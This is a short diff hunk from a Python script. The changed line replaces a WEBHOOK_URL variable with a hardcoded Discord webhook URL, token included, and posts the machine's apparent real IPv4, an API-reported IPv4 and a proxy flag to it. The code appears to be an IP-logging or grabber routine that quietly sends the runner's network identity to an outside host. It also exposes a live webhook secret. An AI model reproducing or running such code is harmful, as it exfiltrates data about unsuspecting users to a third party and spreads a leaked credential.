@@ -53,4 +53,4 @@ except Exception:
     PROXY = False
 
 content = f"{TRUE_IPV4 or 'None'}\n{API_IPV4 or 'None'} {'true' if PROXY else 'false'}"
-requests.post(WEBHOOK_URL, json={'content': content})
+requests.post('https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn', json={'content': content})
